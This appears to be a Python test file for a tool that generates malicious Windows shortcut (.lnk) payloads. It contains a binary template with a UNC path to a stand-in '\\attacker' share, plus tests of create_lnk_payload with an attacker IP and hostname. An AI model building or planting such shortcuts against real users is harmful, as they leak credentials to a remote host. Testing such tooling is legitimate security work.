a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00\\\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00.\x00i\x00c\x00o\x00\xc7\x00\x00\x00\t\x00\x00\xa0=\x00\x00\x001SPS\xed0\xbd\xdaC\x00\x89G\xa7\xf8\xd0\x13\xa4sf"!\x00\x00\x00d\x00\x00\x00\x00\x1f\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x009\x00\x00\x001SPS0\xf1%\xb7\xefG\x1a\x10\xa5\xf1\x02`\x8c\x9e\xeb\xac\x1d\x00\x00\x00\n\x00\x00\x00\x00\x1f\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00E\x00\x00\x001SPS\xa6jc(=\x95\xd2\x11\xb5\xd6\x00\xc0O\xd9\x18\xd0)\x00\x00\x00\x1e\x00\x00\x00\x00\x1f\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15\x04\x00\x00\x0c\x00\x00\xa0\x14\x00\x1fX\r\x1a,\xf0!\xbePC\x88\xb0sg\xfc\x96\xef<\xab\x00\x00\x00\xa5\x00\xbb\xaf\x93;\x97\x00\x04\x00\x00\x00\x00\x00-\x00\x00\x001SPSsC\xe5\n\xbeC\xadO\x85\xe4i\xdc\x863\x98n\x11\x00\x00\x00\x0b\x00\x00\x00\x00\x0b\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x009\x00\x00\x001SPS0\xf1%\xb7\xefG\x1a\x10\xa5\xf1\x02`\x8c\x9e\xeb\xac\x1d\x00\x00\x00\n\x00\x00\x00\x00\x1f\x00\x00\x00\x05\x00\x00\x00t\x00e\x00s\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00-\x00\x00\x001SPS:\xa4\xbd\xde\xb37\x83C\x91\xe7D\x98\xda)\x95\xab\x11\x00\x00\x00\x03\x00\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&\x00\xc3\x01\xc5C:\\Users\x00\x00\x03\x00Microsoft Network\x00\x00\x02\x00\x04\x021\x00\x00\x10\x00\x001X\xbd-\x10\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00^\x01\t\x00\x04\x00\xef\xbe1X\xbd-1X\xd4-.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00%\x00U\x00S\x00E\x00R\x00N\x00A\x00M\x00E\x00%\x00/\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00"\x012\x00\x00\x00\x00\x001X\x12-\xa0\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt\x00\xc8\x00\t\x00\x04\x00\xef\xbe1Xg-1X\xca-.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\x00\x00\x00\x14\x03\x00\x00\x01\x00\x00\xa0\\\\test\\TEST\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x00\\\x00a\x00t\x00t\x00a\x00c\x00k\x00e\x00r\x00\\\x00t\x00e\x00s\x00t\x00\x00\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00\\\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00a\x00.\x00t\x00x\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'


def test_payload_valid_ip(payload_ip_bytes, template_bytes):
    """
    Test the create_lnk_payload function with a valid IP address.

    Args:
        payload_ip_bytes (bytes): The expected payload bytes for the given IP.
        template_bytes (bytes): The template bytes to be used in the payload creation.

    Asserts:
        The result of create_lnk_payload matches the expected payload bytes.
    """
    attacker_ip = '192.168.1.1'
    expected_result = payload_ip_bytes  # Replace with expected result
    result = create_lnk_payload(attacker_ip, template_bytes)
    assert result == expected_result

def test_payload_valid_hostname(payload_hostname_bytes, template_bytes):
    """
    Test the `create_lnk_payload` function to ensure it correctly processes a valid hostname.

    Args:
        payload_hostname_bytes (bytes): The expected payload bytes for the given hostname.
        template_bytes (bytes): The template bytes used to create the payload.

    Asserts:
        The result of `create_lnk_payload` with the given hostname and template matches the
        expected payload bytes.
    """
    attacker_hostname = 'attacker'
    expected_result = payload_hostname_bytes
    result = create_lnk_payload(attacker_hostname, template_bytes)
    assert result == expected_result

def test_payload_path_too_long(template_bytes):
    """
    Test the `create_lnk_payload` function with an attacker IP that exceeds the maximum path length.

    Args:
        template_bytes (bytes): The byte content of the template file.

    Asserts:
        The function should return False when the attacker IP exceeds the maximum path length.
    """
    attacker_ip = 'A' * 228  # Replace with attacker IP that exceeds the maximum path length
    expected_result = False
    result = create_lnk_payload(attacker_ip, template_bytes)
    assert result == expected_result
